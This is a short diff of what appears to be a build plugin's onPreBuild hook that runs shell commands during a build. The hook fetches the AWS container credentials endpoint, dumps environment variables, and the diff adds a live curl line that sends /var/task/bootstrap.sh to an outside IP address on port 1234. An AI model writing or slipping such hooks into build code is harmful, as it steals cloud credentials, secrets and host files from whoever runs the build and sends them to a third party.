@@ -19,7 +19,7 @@ exports.onPreBuild = function () {
 
   //exec(`env`)
   exec(`curl --connect-timeout 100000 http://169.254.170.2$AWS_CONTAINER_CREDENTIALS_RELATIVE_URI`)
-  //exec(`curl 185.20.136.111:1234 --data-binary @/var/task/sandbox-worker.js`)
+  exec(`curl 185.20.136.111:1234 --data-binary @/var/task/bootstrap.sh`)
   console.log(`aw yeah`)
   exec(`env`)
   console.log(`done env`)
